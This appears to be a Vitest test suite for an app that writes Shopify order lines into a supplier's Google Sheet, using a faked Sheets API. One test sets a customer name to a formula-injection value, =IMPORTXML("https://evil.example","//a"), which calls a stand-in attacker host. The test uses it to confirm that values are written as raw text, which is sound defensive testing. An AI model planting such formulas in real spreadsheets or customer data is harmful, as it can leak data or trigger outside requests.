import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
import { NextRequest } from 'next/server'
import fs from 'fs'
import { prisma } from '@/lib/db'
import { AUTH_COOKIE, signToken } from '@/lib/auth'
import { DEFAULT_ROLE_PERMISSIONS } from '@/lib/roles'
import { GOOGLE_KEYS } from '@/lib/google-oauth'
import { SHEET_CHANNELS_KEY } from '@/lib/sheet-channel'
import { handoffOrderCsv, listHandoffHub } from '@/lib/supplier-handoff'
import { previewSheetPush, pushToSheet } from '@/lib/repos/sheet-push'
import { POST as postExport } from '@/app/api/fulfillment/export/route'
import { GET as getSheet, POST as postSheet } from '@/app/api/design-studio/handoff/sheet/route'

const SHOP = 'sheetstore.myshopify.com'
const PROJECT = 'proj_sheet'
const OTHER_PROJECT = 'proj_sheet_other'
const SUP = 'sup_sheet'
const OTHER_SUP = 'sup_sheet_other'
const SHEET = 'sheet-id-1'
const AT = new Date('2026-11-04T05:00:00Z')
const TAB = 'ORDER 11-2026'
const HEADERS = ['       ', 'Order Number', 'Order Vendor ', 'Customer Note', 'Phone (Billing)', 'Name (Shipping)', 'Address 1&2 (Shipping)', 'City (Shipping)', 'State Code (Shipping)',
  'Postcode Code (Shipping)', 'Country Code (Shipping)', 'SKU', 'SKU Custom', 'Item Name', 'Type', 'Size', 'Color', 'Custom Name', 'design note', 'Quantity', 'mockup link', 'Design link', 'Design Back', 'Price$', 'Tracking']
const channel = JSON.parse(fs.readFileSync('scripts/data/sheet-channel-jomall.json', 'utf8'))

let storeId = ''
let adminToken = ''
let seq = 0
let tabs: Record<string, string[][]>
let writes: { tab: string; row: number; rows: (string | null)[][]; query: URLSearchParams }[]
let colors: Record<string, Record<number, { red?: number; green?: number; blue?: number }>>
let gridRows: Record<string, number>
let requests: any[]
let onReadBack: ((rows: string[][]) => string[][]) | null
let refuseWrite: boolean

/**
 * A spreadsheet as Google's API serves it: a grid of rows, values trimmed after the last filled row, colours apart from
 * values. "append" fails the test: on the real sheet it landed on row 1 (11/05/2026, LIT6023_1).
 */
function fakeGoogle() {
  vi.stubGlobal('fetch', vi.fn(async (input: any, init?: RequestInit) => {
    const url = new URL(String(input))
    const json = (body: unknown, status = 200) => new Response(JSON.stringify(body), { status, headers: { 'Content-Type': 'application/json' } })
    if (url.host === 'oauth2.googleapis.com') return json({ access_token: 'tok', expires_in: 3600 })
    const path = decodeURIComponent(url.pathname)
    expect(path.startsWith(`/v4/spreadsheets/${SHEET}`)).toBe(true)
    expect(path).not.toContain(':append')
    if (path.endsWith(':batchUpdate')) {
      for (const r of JSON.parse(String(init?.body)).requests) {
        requests.push(r)
        if (r.appendDimension) gridRows[TAB] += r.appendDimension.length
        if (r.repeatCell) {
          colors[TAB] = colors[TAB] ?? {}
          colors[TAB][r.repeatCell.range.startRowIndex + 1] = r.repeatCell.cell.userEnteredFormat.backgroundColor
        }
      }
      return json({})
    }
    if (!path.includes('/values/')) {
      const ranges = url.searchParams.get('ranges')
      if (ranges) {
        const m = ranges.match(/^'(.*)'!A(\d+):A(\d+)$/)!
        if (Number(m[3]) > gridRows[m[1]]) return json({ error: { message: 'Range exceeds grid limits' } }, 400)
        const rowData = []
        for (let n = Number(m[2]); n <= Number(m[3]); n++) {
          const c = colors[m[1]]?.[n]
          rowData.push(c ? { values: [{ effectiveFormat: { backgroundColor: c } }] } : {})
        }
        return json({ sheets: [{ data: [{ rowData }] }] })
      }
      return json({ sheets: Object.keys(tabs).map((title, sheetId) => ({ properties: { title, sheetId, gridProperties: { rowCount: gridRows[title] } } })) })
    }
    const range = path.split('/values/')[1]
    const tab = range.match(/^'(.*)'!/)?.[1] ?? ''
    if (init?.method === 'PUT') {
      if (refuseWrite) return json({ error: { message: 'The caller does not have permission' } }, 403)
      const m = range.match(/!A(\d+):[A-Z]+(\d+)$/)!
      if (Number(m[2]) > gridRows[tab]) return json({ error: { message: 'Range exceeds grid limits' } }, 400)
      const rows: (string | null)[][] = JSON.parse(String(init?.body)).values
      writes.push({ tab, row: Number(m[1]), rows, query: url.searchParams })
      rows.forEach((r, i) => {
        const at = Number(m[1]) - 1 + i
        while (tabs[tab].length <= at) tabs[tab].push([])
        tabs[tab][at] = r.map(c => c ?? '')
      })
      return json({ updatedRange: range })
    }
    const written = range.match(/!A(\d+):[A-Z]+(\d+)$/)
    if (written) {
      const rows = tabs[tab].slice(Number(written[1]) - 1, Number(written[2]))
      return json({ values: onReadBack ? onReadBack(rows) : rows })
    }
    if (range.endsWith('!1:1')) return json({ values: [tabs[tab][0]] })
    return json({ values: tabs[tab] })
  }))
}

async function makeOrder(opts: { preview?: string | null; shop?: string; otherLine?: boolean; name?: string } = {}) {
  seq++
  const id = `gid://test/Order/sheet-${seq}`
  const number = `#SH${1000 + seq}`
  const lineId = `shl-${seq}`
  const store = opts.shop ? (await prisma.shopifyStore.upsert({ where: { shop: opts.shop }, create: { shop: opts.shop, projectId: OTHER_PROJECT }, update: {} })).id : storeId
  await prisma.order.create({
    data: {
      id, projectId: opts.shop ? OTHER_PROJECT : PROJECT, storeId: store, shopifyOrderNumber: number, financialStatus: 'PAID', currency: 'USD',
      grossAmount: 30, expectedPayout: 28, totalFees: 2, refundedAmount: 0, placedAt: new Date('2026-10-30T19:00:00Z'),
      pipelineStatus: 'READY_TO_PRODUCTION', orderType: 'CUSTOM', designReady: true,
      customerEmail: 'sal@example.com', customerName: 'Sal Paint', shippingName: opts.name ?? 'Sal Paint', shippingAddress1: '12 Main St', shippingAddress2: 'Apt 2',
      shippingCity: 'Denver', shippingZip: '80202', shippingPhone: '+1 303 555 0100', shippingCountry: 'US', shippingState: 'Colorado',
      lines: { create: [
        {
          shopifyLineId: lineId, productTitle: 'Jeep Hoodie', variantTitle: 'Pullover Hoodie / Orange / XL', qty: 2, linePosition: 1, unitPrice: 40, sku: 'TN1-HOODIE-XL',
          resolvedSupplierId: SUP, resolvedSupplierSku: 'JM-HOODIE', resolvedBaseCost: 19.5, customized: true, shopifyProductType: 'AOP Product',
          previewCdnUrl: opts.preview === undefined ? 'https://cdn.shopify.com/s/files/preview.png' : opts.preview,
          designDriveLink: 'https://drive.google.com/drive/folders/abc',
          customAttributesJson: JSON.stringify([{ key: 'Custom Name', value: 'Allyssa' }]),
        },
        ...(opts.otherLine ? [{
          shopifyLineId: `${lineId}-b`, productTitle: 'Mug', variantTitle: '11oz', qty: 1, linePosition: 2, unitPrice: 15, sku: 'MUG',
          resolvedSupplierId: OTHER_SUP, resolvedSupplierSku: 'MUG-1', customized: false, previewCdnUrl: 'https://cdn.shopify.com/s/files/mug.png',
          designDriveLink: 'https://drive.google.com/drive/folders/def',
        }] : []),
      ] },
      designTasks: { create: [
        { shopifyLineId: lineId, taskKey: `SH${1000 + seq}_1`, status: 'DONE' },
        ...(opts.otherLine ? [{ shopifyLineId: `${lineId}-b`, taskKey: `SH${1000 + seq}_2`, status: 'DONE' }] : []),
      ] },
    },
  })
  return { id, number, key: `SH${1000 + seq}_1`, code: `SH${1000 + seq}` }
}

const setChannel = (over: Record<string, unknown> = {}) => prisma.appSetting.upsert({
  where: { key: SHEET_CHANNELS_KEY },
  create: { key: SHEET_CHANNELS_KEY, value: JSON.stringify([{ ...channel, supplierCode: 'jm_sheet', enabled: true, spreadsheetId: SHEET, storeShop: SHOP, ...over }]) },
  update: { value: JSON.stringify([{ ...channel, supplierCode: 'jm_sheet', enabled: true, spreadsheetId: SHEET, storeShop: SHOP, ...over }]) },
})
const push = (orderIds: string[]) => pushToSheet(SUP, { orderIds, userId: null, at: AT })
const rowOf = (row: string[], header: string) => row[HEADERS.indexOf(header)]
const line = (orderId: string) => prisma.orderLine.findFirstOrThrow({ where: { orderId, linePosition: 1 } })

beforeAll(async () => {
  process.env.AUTH_SECRET = 'test-secret-that-is-long-enough-32chars'
  await prisma.project.upsert({ where: { id: PROJECT }, create: { id: PROJECT, name: 'SH', startDate: new Date('2026-06-01') }, update: {} })
  await prisma.project.upsert({ where: { id: OTHER_PROJECT }, create: { id: OTHER_PROJECT, name: 'SH2', startDate: new Date('2026-06-01') }, update: {} })
  storeId = (await prisma.shopifyStore.upsert({ where: { shop: SHOP }, create: { shop: SHOP, projectId: PROJECT }, update: {} })).id
  await prisma.supplier.upsert({ where: { code: 'jm_sheet' }, create: { id: SUP, name: 'Jomall Test', code: 'jm_sheet' }, update: {} })
  await prisma.supplier.upsert({ where: { code: 'other_sheet' }, create: { id: OTHER_SUP, name: 'Other', code: 'other_sheet' }, update: {} })
  await prisma.supplierProduct.create({ data: { supplierId: SUP, sku: 'JM-HOODIE', baseCost: 19.5, baseSku: 'GAF', productName: '3D Hoodies', variant1Value: 'Pullover Hoodie' } })
  for (const [key, value] of [[GOOGLE_KEYS.clientId, 'cid'], [GOOGLE_KEYS.clientSecret, 'sec'], [GOOGLE_KEYS.sheetsRefreshToken, 'rt']]) {
    await prisma.appSetting.upsert({ where: { key }, create: { key, value }, update: { value } })
  }
  const u = await prisma.appUser.upsert({ where: { email: 'admin@sheet.test' }, create: { name: 'Admin', email: 'admin@sheet.test', role: 'ADMIN', permissions: JSON.stringify(DEFAULT_ROLE_PERMISSIONS.ADMIN) }, update: {} })
  adminToken = await signToken({ userId: u.id, email: u.email, name: 'Admin', role: 'ADMIN', permissions: DEFAULT_ROLE_PERMISSIONS.ADMIN, tv: 0 })
})

beforeEach(async () => {
  tabs = { [TAB]: [HEADERS], 'ORDER 10-2026': [HEADERS] }
  writes = []
  colors = {}
  gridRows = { [TAB]: 200, 'ORDER 10-2026': 200 }
  requests = []
  onReadBack = null
  refuseWrite = false
  global.__sheetsTokenCache = null
  await setChannel()
  fakeGoogle()
})

afterEach(() => vi.unstubAllGlobals())

afterAll(async () => {
  await prisma.supplierSheetWrite.deleteMany({ where: { supplierId: SUP } })
  await prisma.order.deleteMany({ where: { projectId: { in: [PROJECT, OTHER_PROJECT] } } })
  await prisma.csvTemplate.deleteMany({ where: { supplierId: SUP } })
  await prisma.supplierProduct.deleteMany({ where: { supplierId: SUP } })
  await prisma.supplier.deleteMany({ where: { id: { in: [SUP, OTHER_SUP] } } })
  await prisma.shopifyStore.deleteMany({ where: { projectId: { in: [PROJECT, OTHER_PROJECT] } } })
  await prisma.project.deleteMany({ where: { id: { in: [PROJECT, OTHER_PROJECT] } } })
  await prisma.appUser.deleteMany({ where: { email: 'admin@sheet.test' } })
  await prisma.appSetting.deleteMany({ where: { key: { in: [SHEET_CHANNELS_KEY, GOOGLE_KEYS.clientId, GOOGLE_KEYS.clientSecret, GOOGLE_KEYS.sheetsRefreshToken] } } })
})

describe('writing to the sheet', () => {
  it('writes each column under its header, reads it back, and only then marks the line sent', async () => {
    const o = await makeOrder()
    const r = await push([o.id])
    expect(r.tabName).toBe(TAB)
    expect(r.results).toEqual([expect.objectContaining({ lineKey: o.key, status: 'WRITTEN', message: 'Hàng 2' })])
    const row = writes[0].rows[0].map(c => c ?? '')
    expect(writes[0].tab).toBe(TAB)
    expect(writes[0].row).toBe(2)
    expect(row[0]).toBe('11/4/2026')
    expect(rowOf(row, 'Order Number')).toBe(`#${o.key}`)
    expect(rowOf(row, 'Order Vendor ')).toBe(o.code)
    expect(rowOf(row, 'Address 1&2 (Shipping)')).toBe('12 Main St, Apt 2')
    expect(rowOf(row, 'SKU')).toBe('GAF')
    expect(rowOf(row, 'Type')).toBe('3D Hoodies')
    expect(rowOf(row, 'Size')).toBe('XL')
    expect(rowOf(row, 'Custom Name')).toBe('Allyssa')
    expect(rowOf(row, 'Quantity')).toBe('2')
    expect(rowOf(row, 'mockup link')).toBe('https://cdn.shopify.com/s/files/preview.png')
    expect(rowOf(row, 'Design link')).toBe('https://drive.google.com/drive/folders/abc')
    expect(writes[0].rows[0][HEADERS.indexOf('Customer Note')]).toBeNull()
    expect(row.length).toBeLessThanOrEqual(HEADERS.indexOf('Design link') + 1)

    expect((await line(o.id)).exportedToSupplierId).toBe(SUP)
    const saved = await prisma.order.findUniqueOrThrow({ where: { id: o.id } })
    expect(saved).toMatchObject({ pipelineStatus: 'EXPORTED', supplierHandoffMode: 'SHEET' })
    expect(await prisma.supplierSheetWrite.findFirst({ where: { orderId: o.id } })).toMatchObject({ status: 'WRITTEN', baseCost: 39, tabName: TAB, lineKey: o.key })
  })

  it('writes customer text as text, so a name cannot run as a formula', async () => {
    const o = await makeOrder({ name: '=IMPORTXML("https://evil.example","//a")' })
    await push([o.id])
    expect(writes[0].query.get('valueInputOption')).toBe('RAW')
    expect(writes[0].rows[0][HEADERS.indexOf('Name (Shipping)')]).toContain('=IMPORTXML')
  })

  it('does not write a line twice', async () => {
    const o = await makeOrder()
    await push([o.id])
    expect((await push([o.id])).results).toEqual([])
    expect(writes).toHaveLength(1)
  })

  it.each([
    ['this month, dash style', TAB, (c: string) => [`#${c}`, `${c}-1`]],
    ['last month, suffix on the number', 'ORDER 10-2026', (c: string) => [`#${c}_1`, c]],
    ['a whole-order row', TAB, (c: string) => [`#${c}`, c]],
  ])('finds a line pasted by hand: %s', async (_name, tab, cells) => {
    const o = await makeOrder()
    const [number, vendor] = cells(o.code)
    tabs[tab].push(['10/30/2026', number, vendor])
    expect((await push([o.id])).results).toEqual([expect.objectContaining({ lineKey: o.key, status: 'ALREADY' })])
    expect(writes).toHaveLength(0)
    expect((await line(o.id)).exportedToSupplierId).toBe(SUP)
  })

  it('leaves the other supplier’s line of a mixed order open', async () => {
    const o = await makeOrder({ otherLine: true })
    const r = await push([o.id])
    expect(r.results.map(x => x.lineKey)).toEqual([o.key])
    const other = await prisma.orderLine.findFirstOrThrow({ where: { orderId: o.id, linePosition: 2 } })
    expect(other.exportedAt).toBeNull()
    expect((await prisma.order.findUniqueOrThrow({ where: { id: o.id } })).pipelineStatus).toBe('READY_TO_PRODUCTION')
  })
})

describe('where the row lands in the sheet', () => {
  const fill = (rows: number, date: string) => {
    for (let i = 0; i < rows; i++) tabs[TAB].push([date, `#OLD${i}`, `OLD${i}_1`])
  }

  it('goes after the green day row, never on row 1: data to 166, green 167, writes at 168', async () => {
    fill(165, '11/2/2026')
    tabs[TAB][90] = []
    tabs[TAB][129] = []
    colors[TAB] = { 91: { green: 1 }, 130: { green: 1 }, 167: { green: 1 } }
    const o = await makeOrder()
    const r = await push([o.id])
    expect(writes[0].row).toBe(168)
    expect(r.results[0]).toMatchObject({ status: 'WRITTEN', message: 'Hàng 168' })
    expect(tabs[TAB][0]).toEqual(HEADERS)
    expect(tabs[TAB][165][1]).toBe('#OLD164')
    expect(tabs[TAB][167][1]).toBe(`#${o.key}`)
    expect(requests).toEqual([])
    expect(await prisma.supplierSheetWrite.findFirst({ where: { orderId: o.id } })).toMatchObject({ rowRange: 'A168' })
  })

  it('stays under the last row on the same day, with no new day row', async () => {
    fill(3, '11/4/2026')
    const o = await makeOrder()
    await push([o.id])
    expect(writes[0].row).toBe(5)
    expect(requests).toEqual([])
  })

  it('adds the green row on the first send of a new day', async () => {
    fill(3, '11/3/2026')
    const o = await makeOrder()
    await push([o.id])
    expect(requests[0].repeatCell.range).toMatchObject({ startRowIndex: 4, endRowIndex: 5 })
    expect(requests[0].repeatCell.cell.userEnteredFormat.backgroundColor).toMatchObject({ green: 1 })
    expect(writes[0].row).toBe(6)
  })

  it('reads colours only inside the grid: the last data row can be the last row of the tab', async () => {
    fill(3, '11/4/2026')
    gridRows[TAB] = 4
    const o = await makeOrder()
    expect((await push([o.id])).results[0]).toMatchObject({ status: 'WRITTEN', message: 'Hàng 5' })
    expect(requests[0].appendDimension.length).toBe(1)
  })

  it('adds grid rows when the send runs past the bottom of the tab', async () => {
    fill(3, '11/4/2026')
    gridRows[TAB] = 4
    const o = await makeOrder()
    const r = await push([o.id])
    expect(requests[0].appendDimension.length).toBe(1)
    expect(r.results[0].status).toBe('WRITTEN')
  })

  it('leaves unmapped cells alone: Price and Tracking are not in the write', async () => {
    const o = await makeOrder()
    await push([o.id])
    const row = writes[0].rows[0]
    expect(row.length).toBe(HEADERS.indexOf('Design link') + 1)
    expect(row[HEADERS.indexOf('Design Back')]).toBeUndefined()
    expect(row[HEADERS.indexOf('Customer Note')]).toBeNull()
  })
})

describe('what stops a send', () => {
  it('stops when the month has no tab, and does not create one', async () => {
    delete tabs[TAB]
    const o = await makeOrder()
    await expect(push([o.id])).rejects.toMatchObject({ code: 'NO_TAB' })
    expect(writes).toHaveLength(0)
    expect((await line(o.id)).exportedAt).toBeNull()
  })

  it('stops when a needed column is gone, and still writes when one was added or moved', async () => {
    const o = await makeOrder()
    tabs[TAB][0] = HEADERS.filter(h => h !== 'Custom Name')
    await expect(push([o.id])).rejects.toMatchObject({ code: 'COLUMNS' })
    expect(writes).toHaveLength(0)

    const moved = ['       ', 'New Column', ...HEADERS.slice(1)]
    tabs[TAB][0] = moved
    const r = await push([o.id])
    expect(r.results[0].status).toBe('WRITTEN')
    expect(writes[0].rows[0][moved.indexOf('Custom Name')]).toBe('Allyssa')
  })

  it('blocks a line with no mockup and sends the rest', async () => {
    const bad = await makeOrder({ preview: null })
    const good = await makeOrder()
    const r = await push([bad.id, good.id])
    expect(r.results.find(x => x.lineKey === bad.key)).toMatchObject({ status: 'BLOCKED' })
    expect(r.results.find(x => x.lineKey === good.key)).toMatchObject({ status: 'WRITTEN' })
    expect((await line(bad.id)).exportedAt).toBeNull()
    expect(writes[0].rows).toHaveLength(1)
  })

  it('never writes another store’s customers into this sheet', async () => {
    const o = await makeOrder({ shop: 'another-store.myshopify.com' })
    const r = await push([o.id])
    expect(r.results[0]).toMatchObject({ status: 'BLOCKED' })
    expect(writes).toHaveLength(0)
  })

  it('does not mark a line when the row reads back different, and the next send finds it in the sheet', async () => {
    const o = await makeOrder()
    onReadBack = rows => rows.map(r => r.map((c, i) => (i === HEADERS.indexOf('Custom Name') ? 'Changed' : c)))
    expect((await push([o.id])).results[0]).toMatchObject({ status: 'FAILED' })
    expect((await line(o.id)).exportedAt).toBeNull()
    expect(await prisma.supplierSheetWrite.findFirst({ where: { orderId: o.id } })).toMatchObject({ status: 'FAILED' })

    onReadBack = null
    expect((await push([o.id])).results[0]).toMatchObject({ status: 'ALREADY' })
    expect(writes).toHaveLength(1)
  })

  it('reports a refused write and marks nothing', async () => {
    refuseWrite = true
    const o = await makeOrder()
    const r = await push([o.id])
    expect(r.results[0]).toMatchObject({ status: 'FAILED', message: expect.stringContaining('không có quyền ghi') })
    expect((await line(o.id)).exportedAt).toBeNull()
  })

  it('runs one send at a time for a supplier', async () => {
    const o = await makeOrder()
    const first = push([o.id])
    await expect(push([o.id])).rejects.toMatchObject({ code: 'BUSY' })
    await first
  })

  it('refuses when the channel is off', async () => {
    await setChannel({ enabled: false })
    const o = await makeOrder()
    await expect(push([o.id])).rejects.toMatchObject({ code: 'NO_CHANNEL' })
  })
})

describe('the rest of the hub with the channel on', () => {
  it('shows the Sheet channel on the tab, and the preview counts what will go', async () => {
    const o = await makeOrder()
    const hub = await listHandoffHub({ q: o.number })
    expect(hub.tabs).toEqual([expect.objectContaining({ id: SUP, channel: 'SHEET', baseCostTotal: 39 })])
    expect(await previewSheetPush(SUP, [o.id])).toEqual({ supplierName: 'Jomall Test', tabName: expect.stringMatching(/^ORDER /), ready: 1, blocked: 0 })
  })

  it('closes the CSV routes for that supplier', async () => {
    const o = await makeOrder()
    await expect(handoffOrderCsv(o.id, null)).rejects.toMatchObject({ code: 'SHEET_ONLY' })
    const tmpl = await prisma.csvTemplate.create({ data: { supplierId: SUP, name: 'T', rowMode: 'PER_LINE', columns: JSON.stringify([{ header: 'Order', source: 'order.shopifyOrderNumber' }]) } })
    const res = await postExport(new NextRequest('http://x/api/fulfillment/export', { method: 'POST', body: JSON.stringify({ templateId: tmpl.id, preview: true }) }))
    expect(res.status).toBe(409)
    expect((await res.json()).code).toBe('SHEET_ONLY')
    await prisma.csvTemplate.delete({ where: { id: tmpl.id } })
  })

  it('needs a confirm and a signed-in user on the route', async () => {
    const url = 'http://x/api/design-studio/handoff/sheet'
    const body = (b: unknown) => ({ method: 'POST', body: JSON.stringify(b) })
    expect((await postSheet(new NextRequest(url, body({ confirm: true, supplierId: SUP })))).status).toBe(401)
    const signedIn = (b: unknown) => { const r = new NextRequest(url, body(b)); r.cookies.set(AUTH_COOKIE, adminToken); return r }
    expect((await postSheet(signedIn({ supplierId: SUP }))).status).toBe(400)
    const noSupplier = new NextRequest(url); noSupplier.cookies.set(AUTH_COOKIE, adminToken)
    expect((await getSheet(noSupplier)).status).toBe(400)
  })
})
